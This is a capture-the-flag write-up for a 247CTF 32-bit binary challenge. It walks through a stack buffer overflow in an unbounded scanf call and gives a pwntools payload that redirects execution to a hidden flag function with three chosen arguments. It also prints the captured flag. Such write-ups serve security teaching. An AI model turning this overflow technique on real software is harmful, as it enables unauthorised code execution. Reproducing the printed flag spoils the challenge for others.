# Hidden Flag Function

## Introduction

`hidden-flag-function-parameters` is a 130 point binary-exploitation challenge
from
247CTF. The description states:

> Can you control this applications flow to gain access to the hidden flag
> function with the correct parameters?

## Information Gathering

### Hint #1

Hints are for financial supporters of the site, so I don't have access.

### Vulnerability Mitigations

```shell
$ checksec hidden_flag_function_with_args
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### Static Analysis

We found a function called `flag` that checks the input parameters to open and
read the flag from `flag.txt`:

```c
void flag(int32_t arg1, int32_t arg2, int32_t arg3)
{
    if ((arg1 == 0x1337 && (arg2 == 0x247 && arg3 == 0x12345678)))
    {
        void var_90;
        fgets(&var_90, 0x80, fopen("flag.txt", "r"));
        printf("How did you get here?\nHave a fl…", &var_90);
    }
}
```

`main` simply prints to stdout and calls `chall`, below:

```c
int32_t chall()
{
    char buf[0x80];
    return __isoc99_scanf("%s", &buf);
}
```

Looks like we have our classic buffer overflow into `buf`. This time we just
need to add our arguments to the stack in order for them to be popped off and
interpreted by `chall` as the parameters to our function.

## Solution

The solution is really the same as the previous challenge,
`hidden-flag-function`, but we need to pass arguments to the function. This
occurs after we're overwritten then return address of `chall` to point to
`flag`. We then push our values to the stack in reverse order (as interpreted
by the stack), and call `chall` with the parameters like so:

```python
# Create the payload.
payload = fit({
    offset: p32(exe.symbols['flag']),
    # Magic bytes found in the function `flag`. Check the README.
    offset + 8: p32(0x1337),        # $ebp + 8
    offset + 12: p32(0x247),        # $ebp + 12
    offset + 16: p32(0x12345678),   # $ebp + 16
})
```

Sending this to the remote server grants us the flag:
`247CTF{da70c8d41fc43fc59cf04f4e591c9ad6}`
